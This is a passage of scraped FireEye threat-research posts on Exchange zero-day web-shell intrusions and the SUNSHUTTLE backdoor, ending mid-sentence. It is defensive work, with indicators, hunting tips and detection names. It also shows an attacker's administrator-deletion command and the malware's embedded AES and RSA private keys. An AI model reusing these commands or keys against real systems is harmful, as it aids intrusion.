      <td><p>OFFICE 365 [Mailbox Folder Permission Change – Inbox and
          Top Of Information Store]</p> </td> <td><p>
          <a
        href="https://attack.mitre.org/techniques/T1098/002/">T1098.002</a></p>
      </td> <td><p>Alert on suspicious modifications of mailbox folder
          permissions for the inbox or top of information store.</p>
      </td> </tr></tbody></table>
http://www.fireeye.com/blog/threat-research/2021/01/remediation-and-hardening-strategies-for-microsoft-365-to-defend-against-unc2452.html2021-01-19T14:00:00.000Z2021-03-18T17:36:53.701ZDetection and Response to Exploitation of Microsoft Exchange Zero-Day Vulnerabilitiesnoemail@noemail.orgMatt Bromiley<p>Beginning in January 2021, Mandiant Managed Defense observed multiple
  instances of abuse of Microsoft Exchange Server within at least one
  client environment. The observed activity included creation of web
  shells for persistent access, remote code execution, and
  reconnaissance for endpoint security solutions. Our investigation
  revealed that the files created on the Exchange servers were owned by
  the user <span class="code">NT AUTHORITY\SYSTEM</span>, a privileged
  local account on the Windows operating system. Furthermore, the
  process that created the web shell was <span
  class="code">UMWorkerProcess.exe</span>, the process responsible for
  Exchange Server’s Unified Messaging Service. In subsequent
  investigations, we observed malicious files created by <span
  class="code">w3wp.exe</span>, the process responsible for the Exchange
  Server web front-end.</p>
 <p>In response to this activity, we built threat hunting campaigns
  designed to identify additional Exchange Server abuse. We also
  utilized this data to build higher-fidelity detections of web server
  process chains. On March 2, 2021, Microsoft released a <a
    href="https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/">blog
  post</a> that detailed multiple zero-day vulnerabilities used to
  attack on-premises versions of Microsoft Exchange Server. Microsoft
  also issued emergency Exchange Server updates for the following vulnerabilities:</p>
 <table border="1" cellspacing="0" cellpadding="0" width="651"> <tbody>
    <tr>
      <td width="131" valign="top"><p>
          <b>CVE</b></p> </td> <td width="105" valign="top"><p>
          <b>Risk Rating</b></p> </td> <td width="111" valign="top"><p>
          <b>Access Vector</b></p> </td> <td width="127" valign="top"><p>
          <b>Exploitability</b></p> </td> <td width="94" valign="top"><p>
          <b>Ease of Attack</b></p> </td> <td width="82" valign="top"><p>
          <b>Mandiant Intel</b></p> </td> </tr>
    <tr>
      <td width="131" valign="top"><p>
          <b>CVE-2021-26855</b></p> </td> <td width="105"
        valign="top"><p>Critical</p> </td> <td width="111"
        valign="top"><p>Network</p> </td> <td width="127"
        valign="top"><p>Functional</p> </td> <td width="94"
        valign="top"><p>Easy</p> </td> <td width="82" valign="top"><p>
          <a
        href="https://intelligence.fireeye.com/reports/21-00004941">Link</a></p>
      </td> </tr>
    <tr>
      <td width="131" valign="top"><p>
          <b>CVE-2021-26857</b></p> </td> <td width="105"
        valign="top"><p>Medium</p> </td> <td width="111"
        valign="top"><p>Network</p> </td> <td width="127"
        valign="top"><p>Functional</p> </td> <td width="94"
        valign="top"><p>Easy</p> </td> <td width="82" valign="top"><p>
          <a
        href="https://intelligence.fireeye.com/reports/21-00004938">Link</a></p>
      </td> </tr>
    <tr>
      <td width="131" valign="top"><p>
          <b>CVE-2021-26858</b></p> </td> <td width="105"
        valign="top"><p>Medium</p> </td> <td width="111"
        valign="top"><p>Network</p> </td> <td width="127"
        valign="top"><p>Functional</p> </td> <td width="94"
        valign="top"><p>Easy</p> </td> <td width="82" valign="top"><p>
          <a
        href="https://intelligence.fireeye.com/reports/21-00004944">Link</a></p>
      </td> </tr>
    <tr>
      <td width="131" valign="top"><p>
          <b>CVE-2021-27065</b></p> </td> <td width="105"
        valign="top"><p>Medium</p> </td> <td width="111"
        valign="top"><p>Network</p> </td> <td width="127"
        valign="top"><p>Functional</p> </td> <td width="94"
        valign="top"><p>Easy</p> </td> <td width="82" valign="top"><p>
          <a
        href="https://intelligence.fireeye.com/reports/21-00004939">Link</a></p>
      </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Table 1: List of March 2021 Microsoft Exchange
    CVEs and FireEye Intel Summaries</span></p>
 <p>The activity reported by Microsoft aligns with our observations.
    <b>FireEye currently tracks this activity in three clusters,
    UNC2639, UNC2640, and UNC2643. We anticipate additional clusters as
    we respond to intrusions.</b> We recommend following Microsoft’s
  guidance and patching Exchange Server immediately to mitigate this activity.</p>
 <p>Based on our telemetry, we have identified an array of affected
  victims including US-based retailers, local governments, a university,
  and an engineering firm. Related activity may also include a Southeast
  Asian government and Central Asian telecom. <a
    href="https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/">Microsoft
  reported</a> the exploitation occurred together and is linked to a
  single group of actors tracked as “HAFNIUM”, a group that has
  previously targeted the US-based defense companies, law firms,
  infectious disease researchers, and think tanks.</p>
 <p>In this blog post, we will detail our observations on the active
  investigations we are currently performing. As our experience with and
  knowledge of this threat actor grows, we will update this post or
  release new technical details as appropriate. For our Managed Defense
  Customers, we have launched a Community Protection Event that will
  provide frequent updates on this threat actor and activity. </p>
 <p>We will be discussing these attacks more in an <a
    href="https://www.brighttalk.com/webcast/7451/475010?utm_source=FireEye&amp;utm_medium=brighttalk&amp;utm_campaign=475010">upcoming
    webinar on Mar. 17, 2021</a>.</p>
 <h4>From Exploit to Web Shell</h4>
 <p>Beginning in January 2021, Mandiant Managed Defense observed the
  creation of web shells on one Microsoft Exchange server file system
  within a customer’s environment. The web shell, named <span
  class="code">help.aspx</span> (MD5: 4b3039cf227c611c45d2242d1228a121),
  contained code to identify the presence of (1) FireEye xAgent, (2)
  CarbonBlack, or (3) CrowdStrike Falcon endpoint products and write the
  output of discovery. Figure 1 provides a snippet of the web shell’s code.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/exchange-0day/fig1.png" alt="" />
  <br /> <span class="type-XS">Figure 1: Snippet of the web shell
    help.aspx, crafted to identify the presence of endpoint security
    software on a victim system</span></p>
 <p>The web shell was written to the system by the <span
  class="code">UMWorkerProcess.exe</span> process, which is associated
  with Microsoft Exchange Server’s Unified Messaging service. This
  activity suggested exploitation of CVE-2021-26858.</p>
 <p>Approximately twenty days later, the attacker placed another web
  shell on a separate Microsoft Exchange Server. This second, partially
  obfuscated web shell, named <span class="code">iisstart.aspx</span>
  (MD5: 0fd9bffa49c76ee12e51e3b8ae0609ac), was more advanced and
  contained functions to interact with the file system. As seen in
  Figure 2, the web shell included the ability to run arbitrary commands
  and upload, delete, and view the contents of files.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/exchange-0day/fig2.png" alt="" />
  <br /> <span class="type-XS">Figure 2: Snippet of iisstart.aspx,
    uploaded by the attacker in late January 2021</span></p>
 <p>While the use of web shells is common amongst threat actors, the
  parent processes, timing, and victim(s) of these files clearly
  indicate activity that commenced with the abuse of Microsoft Exchange.</p>
 <p>In March 2021, in a separate environment, we observed a threat actor
  utilize one or more vulnerabilities to place at least one web shell on
  the vulnerable Exchange Server. This was likely to establish both
  persistence and secondary access, as in other environments. In this
  case, Mandiant observed the process <span
  class="code">w3wp.exe</span>, (the IIS process associated with the
  Exchange web front-end) spawning <span class="code">cmd.exe</span> to
  write a file to disk. The file, depicted in Figure 3, matches
  signatures for the tried-and-true <a
    href="https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-china-chopper.pdf">China Chopper</a>.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/exchange-0day/fig3.png" alt="" />
  <br /> <span class="type-XS">Figure 3: Snippet of China Chopper web
    shell found on a compromised Exchange Server system</span></p>
 <p>We observed that in at least two cases, the threat actors
  subsequently issued the following command against the Exchange web server:</p>
 <p>
  <span class="code">net group &quot;Exchange Organization
    administrators&quot; administrator /del /domain.</span></p>
 <p>This command attempts to delete the <span
  class="code">administrator</span> user from the <span
    class="code">Exchange Organizations administrators</span> group,
  beginning with the Domain Controller in the current domain. If the
  system is in a single-system domain, it will execute on the local computer.</p>
 <p>Per Microsoft’s blog, they have identified additional
  post-exploitation activities, including:</p>
 <ul> <li>Credential theft via dumping of LSASS process memory.</li>
    <li>Compression of data for exfiltration via 7-Zip.</li> <li>Use of
    Exchange PowerShell Snap-ins to export mailbox data.</li> <li>Use of
    additional offensive security tools <a
    href="https://github.com/cobbr/Covenant">Covenant</a>, <a
    href="https://github.com/samratashok/nishang">Nishang</a>, and <a
    href="https://github.com/besimorhino/powercat">PowerCat</a> for
    remote access.</li> </ul>
 <p>The activity we have observed, coupled with others in the
  information security industry, indicate that these threat actors are
  likely using Exchange Server vulnerabilities to gain a foothold into
  environments. This activity is followed quickly by additional access
  and persistent mechanisms. As previously stated, we have multiple
  ongoing cases and will continue to provide insight as we respond to intrusions.</p>
 <h4>Investigation Tips</h4>
 <p>We recommend checking the following for potential evidence of compromise:</p>
 <ul> <li>Child processes of <span
    class="code">C:\Windows\System32\inetsrv\w3wp.exe</span> on Exchange
    Servers, particularly <span class="code">cmd.exe</span>.</li>
    <li>Files written to the system by <span
    class="code">w3wp.exe</span> or <span
  class="code">UMWorkerProcess.exe</span>.</li> <li>ASPX files owned by
    the <span class="code">SYSTEM</span> user</li> <li>New, unexpected
    compiled ASPX files in the <span class="code">Temporary ASP.NET
    Files</span> directory</li> <li>Reconnaissance,
    vulnerability-testing requests to the following resources from an
    external IP address:<ul> <li>
        <span class="code">/rpc/</span> directory</li> <li>
        <span class="code">/ecp/DDI/DDIService.svc/SetObject</span></li>
        <li>Non-existent resources</li> <li>With suspicious or spoofed
        HTTP User-Agents</li> </ul> </li> <li>Unexpected or suspicious
    Exchange PowerShell SnapIn requests to export mailboxes</li> </ul>
 <p>In our investigations to date, the web shells placed on Exchange
  Servers have been named differently in each intrusion, and thus the
  file name alone is not a high-fidelity indicator of compromise.</p>
 <p>If you believe your Exchange Server was compromised, we recommend
  investigating to determine the scope of the attack and dwell time of
  the threat actor.</p>
 <p>Furthermore, as system and web server logs may have time or size
  limits enforced, we recommend preserving the following artifacts for
  forensic analysis:</p>
 <ul> <li>At least 14 days of HTTP web logs from the <span
    class="code">inetpub\Logs\LogFiles</span> directories (include logs
    from all subdirectories)</li> <li>The contents of the Exchange Web
    Server (also found within the <span class="code">inetpub</span>
  folder)</li> <li>At least 14 days of Exchange Control Panel (ECP)
    logs, located in <span class="code">Program Files\Microsoft\Exchange
  Server\v15\Logging\ECP\Server</span></li> <li>Microsoft Windows event
  logs</li> </ul>
 <p>We have found significant hunting and analysis value in these log
  folders, especially for suspicious CMD parameters in the ECP Server
  logs. We will continue updating technical details as we observe more
  related activity.</p>
 <h4>Technical Indicators</h4>
 <p>The following are technical indicators we have observed, organized
  by the threat groups we currently associate with this activity. To
  increase investigation transparency, we are including a Last Known
  True, or LKT, value for network indicators. The LKT timestamp
  indicates the last time Mandiant knew the indicator was associated
  with the adversary; however, as with all ongoing intrusions, a
  reasonable time window should be considered.</p>
 <h5>UNC2639</h5>
 <table border="1" cellspacing="0" cellpadding="0" width="613"> <tbody>
    <tr>
      <td width="151" valign="top"><p>
          <b>Indicator</b></p> </td> <td width="155" valign="top"><p>
          <b>Type</b></p> </td> <td width="307" valign="top"><p>
          <b>Note</b></p> </td> </tr>
    <tr>
      <td width="151" valign="top"><p>165.232.154.116</p> </td> <td
        width="155" valign="top"><p>Network: IP Address</p> </td> <td
        width="307" valign="top"><p>Last known true: 2021/03/02
        02:43</p> </td> </tr>
    <tr>
      <td width="151" valign="top"><p>182.18.152.105</p> </td> <td
        width="155" valign="top"><p>Network: IP Address</p> </td> <td
        width="307" valign="top"><p>Last known true: 2021/03/03
        16:16</p> </td> </tr></tbody></table>
 <h5>UNC2640</h5>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="131" valign="top"><p>
          <b>Indicator</b></p> </td> <td width="118" valign="top"><p>
          <b>Type</b></p> </td> <td width="341" valign="top"><p>
          <b>MD5</b></p> </td> </tr>
    <tr>
      <td width="131" valign="top"><p>help.aspx</p> </td> <td
        width="118" valign="top"><p>File: Web shell</p> </td> <td
        width="341" valign="top"><p>4b3039cf227c611c45d2242d1228a121</p>
      </td> </tr>
    <tr>
      <td width="0" valign="top"><p>iisstart.aspx</p> </td> <td
        width="0" valign="top"><p>File: Web shell</p> </td> <td
        width="0" valign="top"><p>0fd9bffa49c76ee12e51e3b8ae0609ac</p>
      </td> </tr></tbody></table>
 <h5>UNC2643</h5>
 <table border="1" cellspacing="0" cellpadding="0" width="589"> <tbody>
    <tr>
      <td width="0" valign="top"><p>
          <b>Indicator</b></p> </td> <td width="0" valign="top"><p>
          <b>Type</b></p> </td> <td width="276" valign="top"><p>
          <b>MD5/Note</b></p> </td> </tr>
    <tr>
      <td width="0" valign="top"><p>Cobalt Strike BEACON</p> </td> <td
        width="0" valign="top"><p>File: Shellcode</p> </td> <td
        width="276" valign="top"><p>79eb217578bed4c250803bd573b10151</p>
      </td> </tr>
    <tr>
      <td width="0" valign="top"><p>89.34.111.11</p> </td> <td width="0"
          valign="top"><p>Network: IP Address</p> </td> <td width="276"
          valign="top"><p>Last known true: 2021/03/03 21:06</p> </td> </tr>
    <tr>
      <td width="0" valign="top"><p>86.105.18.116</p> </td> <td
        width="0" valign="top"><p>Network: IP Address</p> </td> <td
        width="276" valign="top"><p>Last known true: 2021/03/03
        21:39</p> </td> </tr></tbody></table>
 <h4>Detecting the Techniques</h4>
 <p>FireEye detects this activity across our platforms. The following
  contains specific detection names that provide an indicator of
  Exchange Server exploitation or post-exploitation activities we
  associated with these threat actors.</p>
 <table border="1" cellspacing="0" cellpadding="0" width="695"> <tbody>
    <tr>
      <td width="143" valign="top"><p>
          <b>
            <u>Platform</u>(s)</b></p> </td> <td width="552" valign="top"><p>
          <b>
            <u>Detection Name</u></b></p> </td> </tr>
    <tr>
      <td width="143" valign="top"><ul> <li>Network Security </li>
            <li>Email Security </li> <li>Detection On Demand </li>
            <li>Malware File Scanning </li> <li>Malware File Storage
          Scanning </li> </ul> </td> <td width="552" valign="top"><ul>
          <li>FEC_Trojan_ASPX_Generic_2</li>
          <li>FE_Webshell_ASPX_Generic_33</li>
          <li>FEC_APT_Webshell_ASPX_HEARTSHELL_1</li>
          <li>Exploit.CVE-2021-26855</li> </ul> </td> </tr>
    <tr>
      <td width="143" valign="top"><p>Endpoint Security</p> </td> <td
        width="552" valign="top"><p>
          <b>
            <u>Real-Time (IOC)</u></b></p> <ul> <li>SUSPICIOUS CODE
            EXECUTION FROM EXCHANGE SERVER (EXPLOIT)</li> <li>ASPXSPY
            WEBSHELL CREATION A (BACKDOOR)</li> <li>PROCDUMP ON
            LSASS.EXE (METHODOLOGY)</li> <li>TASKMGR PROCESS DUMP OF
            LSASS.EXE A (METHODOLOGY)</li> <li>NISHANG POWERSHELL TCP
            ONE LINER (BACKDOOR)</li> <li>SUSPICIOUS POWERSHELL USAGE
          (METHODOLOGY)</li> <li>POWERSHELL DOWNLOADER
          (METHODOLOGY)</li> </ul> <p>
          <b>
            <u>Malware Protection (AV/MG)</u></b></p> <ul>
          <li>Trojan.Agent.Hafnium.A</li> </ul> <p>
          <b>
            <u>Module Coverage</u></b></p> <ul> <li>[Process Guard] -
            prevents dumping of LSASS memory using the procdump
          utility.</li> </ul> </td> </tr>
    <tr>
      <td width="143" valign="top"><p>Helix</p> </td> <td width="552"
          valign="top"><ul> <li>WINDOWS METHODOLOGY [Unusual Web Server
            Child Process]</li> <li>MICROSOFT EXCHANGE [Authentication
            Bypass (CVE-2021-26855)]</li> </ul> </td> </tr></tbody></table>
http://www.fireeye.com/blog/threat-research/2021/03/detection-response-to-exploitation-of-microsoft-exchange-zero-day-vulnerabilities.html2021-03-04T22:30:00.000Z2021-03-09T18:38:54.907ZNew SUNSHUTTLE Second-Stage Backdoor Uncovered Targeting U.S.-Based
Entity; Possible Connection to UNC2452noemail@noemail.orgLindsay Smith<h4>Executive Summary</h4>
 <ul> <li>In August 2020, a U.S.-based entity uploaded a new backdoor
    that we have named SUNSHUTTLE to a public malware repository.</li>
    <li>SUNSHUTTLE is a second-stage backdoor written in GoLang that
    features some detection evasion capabilities.</li> <li>Mandiant
    observed SUNSHUTTLE at a victim compromised by UNC2452, and have
    indications that it is linked to UNC2452, but we have not fully
    verified this connection.</li> <li>Please see the Technical Annex
    for relevant MITRE ATT&amp;CK techniques (T1027, T1027.002,
    T1059.003, T1071.001, T1105, T1140, T1573.001).</li> </ul>
 <p>
  <i>The activity discussed in this blog post is also detailed in a <a
      href="https://www.microsoft.com/security/blog/2021/03/04/goldmax-goldfinder-sibot-analyzing-nobelium-malware/">Microsoft
      blog post</a>. We thank the team at Microsoft and other partners
    for their great collaboration in tracking this actor.</i></p>
 <h4>Threat Detail</h4>
 <p>Mandiant Threat Intelligence discovered a new backdoor uploaded by a
  U.S.-based entity to a public malware repository in August 2020 that
  we have named SUNSHUTTLE. SUNSHUTTLE is written in GO, and reads an
  embedded or local configuration file, communicates with a hard-coded
  command and control (C2) server over HTTPS, and supports commands
  including remotely uploading its configuration, file upload and
  download, and arbitrary command execution. Notably, SUNSHUTTLE uses
  cookie headers to pass values to the C2, and if configured, can select
  referrers from a list of popular website URLs to help such network
  traffic “blend in.”</p>
 <ul> <li>The SUNSHUTTLE backdoor file examined, “Lexicon.exe” (MD5:
    9466c865f7498a35e4e1a8f48ef1dffd), was written in GoLang. The file
    unpacks into MD5: 86e89349fefcbdd9d2c80ca30fa85511.</li> <li>The
    infection vector for SUNSHUTTLE is not known. It is most likely a
    second-stage backdoor dropped after an initial compromise.</li>
    <li>The SUNSHUTTLE sample uses the actor-controlled server
    “reyweb[.]com” for C2. “Reyweb[.]com” is registered anonymously via
    NameSilo, a domain provider who accepts bitcoin payment and has been
    used for C2 registration by state-sponsored APTs in the past,
    including Russia-nexus actors and Iran-nexus APTs</li> </ul>
 <p>Mandiant observed SUNSHUTTLE at a victim compromised by UNC2452, and
  have indications that it is linked to UNC2452, but we have not fully
  verified this connection.</p>
 <p>Please see FireEye’s resource center for <a
    href="https://www.fireeye.com/current-threats/sunburst-malware.html">background
    on UNC2452 and the SUNBURST campaign</a>.</p>
 <h4>Outlook and Implications</h4>
 <p>The new SUNSHUTTLE backdoor is a sophisticated second-stage backdoor
  that demonstrates straightforward but elegant detection evasion
  techniques via its “blend-in” traffic capabilities for C2
  communications. SUNSHUTTLE would function as second-stage backdoor in
  such a compromise for conducting network reconnaissance alongside
  other SUNBURST-related tools.</p>
 <h4>Technical Annex</h4>
 <p>Mandiant Threat Intelligence discovered a sample of the SUNSHUTTLE
  backdoor uploaded to an online multi-Antivirus scan service.
  SUNSHUTTLE is a backdoor, written in GO, that reads an embedded or
  local configuration file, communicates with its C2 server over HTTPS
  and supports commands including remotely updating its configuration,
  file upload and download, and arbitrary command execution.</p>
 <ul> <li>Lexicon.exe (MD5: 9466c865f7498a35e4e1a8f48ef1dffd)<ul>
        <li>C2: reyweb[.]com</li> <li>UNAVAILABLE (MD5:
          86e89349fefcbdd9d2c80ca30fa85511)<ul> <li>Unpacked version of
          9466c865f7498a35e4e1a8f48ef1dffd</li> </ul> </li> </ul> </li> </ul>
 <h4>Infection Vector</h4>
 <p>For the samples analyzed, the infection vector is not known.</p>
 <h4>Execution</h4>
 <p>
  <i>Execution Summary</i></p>
 <p>SUNSHUTTLE is a backdoor written in GoLang. Once SUNSHUTTLE is
  executed, a high-level description of the execution is the following:</p>
 <ul> <li>Configuration settings determined</li> <li>Request a “session
    key” from the C2</li> <li>Retrieve the “session key” from the C2<ul>
        <li>Once a session key is retrieved, SUNSHUTTLE begins command
        request beaconing loop</li> </ul> </li> <li>Begin command
    request beaconing</li> <li>Resolve command and perform action</li> </ul>
 <p>The SUNSHUTTLE sample analyzed retains the names of the routines
  used by the malware, which include the following:</p>
 <table border="0" cellspacing="0" cellpadding="0" width="100%"> <tbody>
    <tr>
      <td valign="top"><p>
          <span class="code">main.request_session_key</span></p> </td> </tr>
    <tr>
      <td valign="top"><p>
          <span class="code">main.define_internal_settings</span></p>
      </td> </tr>
    <tr>
      <td valign="top"><p>
          <span class="code">main.send_file_part</span></p> </td> </tr>
    <tr>
      <td valign="top"><p>
          <span class="code">main.clean_file</span></p> </td> </tr>
    <tr>
      <td valign="top"><p>
          <span class="code">main.send_command_result</span></p> </td> </tr>
    <tr>
      <td valign="top"><p>
          <span class="code">main.retrieve_session_key</span></p> </td> </tr>
    <tr>
      <td valign="top"><p>
          <span class="code">main.save_internal_settings</span></p>
      </td> </tr>
    <tr>
      <td valign="top"><p>
          <span class="code">main.resolve_command</span></p> </td> </tr>
    <tr>
      <td valign="top"><p>
          <span class="code">main.write_file</span></p> </td> </tr>
    <tr>
      <td valign="top"><p>
          <span class="code">main.beaconing</span></p> </td> </tr>
    <tr>
      <td valign="top"><p>
          <span class="code">main.wget_file</span></p> </td> </tr>
    <tr>
      <td valign="top"><p>
          <span class="code">main.fileExists</span></p> </td> </tr>
    <tr>
      <td valign="top"><p>
          <span class="code">main.encrypt</span></p> </td> </tr>
    <tr>
      <td valign="top"><p>
          <span class="code">main.decrypt</span></p> </td> </tr>
    <tr>
      <td valign="top"><p>
          <span class="code">main.random</span></p> </td> </tr>
    <tr>
      <td valign="top"><p>
          <span class="code">main.removeBase64Padding</span></p> </td> </tr>
    <tr>
      <td valign="top"><p>
          <span class="code">main.addBase64Padding</span></p> </td> </tr>
    <tr>
      <td valign="top"><p>
          <span class="code">main.delete_empty</span></p> </td> </tr>
    <tr>
      <td valign="top"><p>
          <span class="code">main.Unpad</span></p> </td> </tr>
    <tr>
      <td valign="top"><p>
          <span class="code">main.GetMD5Hash</span></p> </td> </tr>
    <tr>
      <td valign="top"><p>
          <span class="code">main.Pad</span></p> </td> </tr></tbody></table>
 <p>
  <b>Note: </b>Throughout the SUNSHUTTLE backdoor, unique string
  identifiers are used to indicate the operation being performed to the
  C2 via a Cookie header, and unique string identifiers are also used to
  validate and parse response content from the C2. These unique string
  values are thought to be unique and random per compiled sample.</p>
 <p>
  <i>Initial Execution</i></p>
 <p>Once executed, the SUNSHUTTLE backdoor enumerates the victim’s MAC
  address and compares it to a hardcoded MAC address value
  “c8:27:cc:c2:37:5a”. If a match is found the backdoor exits. The MAC
  address is likely a default MAC address for the Windows sandbox
  network adapter.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/sunshuttle/fig1.png" alt="" />
  <br /> <span class="type-XS">Figure 1: Mac address check</span></p>
 <p>
  <i>Configuration</i></p>
 <p>If the check is successful, the SUNSHUTTLE backdoor then enters a
  routine named “﻿main_define_internal_settings”, which handles creation
  of the configuration file if one doesn’t already exist in the
  directory from which SUNSHUTTLE is running. For the sample analyzed,
  the configuration filename is “config.dat.tmp”. The configuration data
  is Base64 encoded and AES-256 encrypted using the following key:</p>
 <p>
  <span class="code">hz8l2fnpvp71ujfy8rht6b0smouvp9k8</span></p>
 <p>The configuration has the following example values when Base64
  decoded and AES decrypted:</p>
 <p>
  <span
    class="code">48b9e25491e088a35105274cae0b9e67|5-15|0|0|TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6NzUuMCkgR2V<br />  ja28vMjAxMDAxMDEgRmlyZWZveC83NS4w</span></p>
 <p>The configuration holds several values delimited by a “|” character,
  which are briefly described as follows.</p>
 <ul> <li>48b9e25491e088a35105274cae0b9e67<ul> <li>MD5 hash of the
        current timestamp calculated during execution.</li> </ul> </li>
      <li>5-15<ul> <li>Lower/upper limits used to randomly generate
        sleep times as SUNSHUTTLE executes</li> </ul> </li> <li>0<ul>
        <li>0 or 1 — Utilize “blend-in” traffic requests. Internally
        called “false_requesting”</li> </ul> </li> <li>0<ul>
        <li>Activate execution timestamp (0 by default) — execution
        &quot;activates&quot; or continues if current time is greater
        than the value in the configuration</li> </ul> </li>
    <li>TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6NzUuMCkgR2Vja2<br />
      8vMjAxMDAxMDEgRmlyZWZveC83NS4w<ul> <li>Base64-encoded User-agent
        used in HTTPS requests</li> <li>Decoded: Mozilla/5.0 (Windows NT
        10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0</li>
    </ul> </li> </ul>
 <p>If set in the configuration, the “blend-in” traffic occurs as the
  malware executes and transitions through its routines. The following
  URLs are leveraged for the “blend-in” requests:</p>
 <ul> <li>https://reyweb[.]com/icon.ico</li>
  <li>https://reyweb[.]com/icon.png</li>
  <li>https://reyweb[.]com/script.js</li>
  <li>https://reyweb[.]com/style.css</li>
  <li>https://reyweb[.]com/css/style.css</li>
  <li>https://reyweb[.]com/css/bootstrap.css</li>
  <li>https://reyweb[.]com/scripts/jquery.js</li>
  <li>https://reyweb[.]com/scripts/bootstrap.js</li>
  <li>https://cdn.mxpnl[.]com/</li> <li>https://cdn.google[.]com/</li>
  <li>https://cdn.jquery[.]com/</li> <li>https://code.jquery[.]com/</li>
  <li>https://cdn.cloudflare[.]com/</li> </ul>
 <p>
  <i>Session Key Mechanism</i></p>
 <p>SUNSHUTTLE performs initial requests to the C2 in order to request
  and then retrieve what it internally refers to as a session key. The
  retrieved session key from the C2 appears to be RSA decrypted using
  the following private key that is embedded in SUNSHUTTLE and believed
  to be unique per compiled sample. Analysis is on-going on how the
  decrypted session key is used, but it is likely a session key used to
  encrypt content once SUNSHUTTLE transitions to its command-and-control routines.</p>
 <p style="margin-left: 40.0px;">
  <span class="code">            -----BEGIN PRIVATE KEY-----<br />
    MIIEowIBAAKCAQEA0Aj/3K3m/rKNESwUfHC9qAhnsNYA9bJ4HQ30DPsfPDvbbHZm<br />
    Uj5nyp2abjYZYMQbWa2+ZO4Ixgfdm0FzsAH/haKIN4sSkbw+YRESYW35MnMI3Adf<br />
    mj/eK/yKNblyoe/7iWP3nz+y4Q/QI0L6BrF7VodTaDYtDup3iI+B5zjmhElf9Fmg<br />
    S1JiDUgydz5VXJR/esv6hB7GMfEb/3sIAzv5qcwEvGK5HH1EzQ7zjauyhbsF9pHR<br />
    zCFYlvW4OtaU0o3xjVufo5UwYRS5p/EFpof45zuJGLJ02cKUmxc0OX53t3Bn9WXY<br />
    aDDhYp/RPzywG8N9gTBv8rKxRIsFxxKu+8wK+QIDAQABAoIBAGe4hPDe13OXTBQK<br />
    uTAN+dEkV6ZoHFRjpdU+lrY+IiWi5lSed4d7y73OdCeM23xOaiB9KpchwsgRNeDp<br />
    cieH54EWNvoSYbC9fRBiNZrT/NG1Xu5s0rKSM1AU+kes7UVl5DBs4hHI7YOeobRi<br />
    +UuLA6ZxlBk6IZ71MaGpgyfoS64aDMvZDtcaTEGzw6dRQAU9255DTIc2YYbq8MqL<br />
    zSafD5eBDH3Izmblg0kXiidec1A1sytz5u8xW4XckHfp4xePLVw/RvLJGqNJMK5M<br />
    7tXAFwPzg+u4k7ce7uNw9VWW7n28T9xznUux1gtPQj1N6goDaBaOqY+h0ia9F1RP<br />
    wu6ZtG0CgYEA8vCFmAGmMz4vjO04ELyPnvnaS6CReYCVzmvNugIDlxBLDGCnKBVx<br />
    et7qEk3gMkbtcDUOZpXQAIVCWQNupAhI0t5bb/Pfw3HtH3Xt5NRUYmwxTgNRe06D<br />
    i4ICsg2+8TDinjne9hzsEe9DYE2WRrtLMJ+IPD+QE94J3Sei03k1wpMCgYEA2zga<br />
    Tff6jQeNn9G0ipHa1DvJmi98px51o0r7TUfZRxJfgg4ckyMsZUHKALrZszKAnxP7<br />
    MXYrJuOHpsp0EZc1e3uTjFzrKyKRTQ78c7MNGv07w1PlZuNLtkoqepUjkQzdxKZO<br />
    g9gG0O4lC5jjnSg8jUSChhZn+jrU8Vx7ByOP98MCgYAWi5+6RZzo8IJ1L6aeVwF1<br />
    HXbWweX+QqKkb3i+JGW05Twxv96DZ8oKPxm17Sg7Qj3Sxfm6J3kQM02++QSRkHtB<br />
    poUR1K4Vc0MwQj97lwDlyWih9sjfCqBGmCAr6f6oX4MIcBJzAKgf2faEv26MzeDi<br />
    eEuqW7PBRD/iGEWSHpOQpQKBgQDRgV+aTjk0mRhfugHKQLSbCnyUj3eZG8IfiiR7<br />
    agQcKVH/sE7cy8u9Bc/xPKGb4dMMtQLm9WEuLFtTKr8cpJ8nYSXVCmRx9/pXY9Af<br />
    HuqSdZutBDwERYvxLhZEys2P7XTwYGQ/GrEA8eeTms1FP9QGyofXcAh1G86w0Mp/<br />
    Oxx3EwKBgHXxgQa4/ngTlMNhWP+IvHOlOVAxDK2GL3XQdr8fudZe9c1d7VzIbYj6<br />
    gbwLT9qi0wG5FAWqH163XucAirT6WCtAJ3tK0lfbS7oWJ7L/Vh1+vOe6jfS/nQna<br />
    Ao2QPbN8RiltHeaAq0ZfrgwrQuP5fmigmBa5lOWID/eU2OLlvJGi<br />  -----END
    PRIVATE KEY---</span></p>
 <p>After the configuration is created or read from, SUNSHUTTLE enters a
  routine named “﻿main_request_session_key”. The malware will iterate
  over this routine until it’s successful, sleeping a period of time
  after each iteration.</p>
 <p>Inside the “﻿main_request_session_key” routine, SUNSHUTTLE
  constructs an HTTPS request to its configured C2. Upon an HTTP 200
  response from the request, the response data from the C2 is expected
  to not contain the following string for the sample analyzed:</p>
 <ul> <li>ywQdjLuHHC</li> </ul>
 <p>The request_session_key routine returns a 1 if the string is not in
  the response and a -1 if it is in the response. If the result of the
  request_session_key is 1, SUNSHUTTLE will execute the
  retrieve_session_key routine.</p>
 <p>The retrieve_session_key routine again contacts the C2 and downloads
  content that is expected to be decrypted by the aforementioned
  embedded private key. The decrypted content is likely a session key
  used to encrypt content once SUNSHUTTLE transitions to its
  command-and-control routines.</p>
 <p>
  <i>Commanding</i></p>
 <p>Once a session key is retrieved from the C2, SUNSHUTTLE begins the
  beaconing and “resolve_command” routines in a loop. SUNSHUTTLE first
  issues a beacon to retrieve a command. After, SUNSHUTTLE will enter
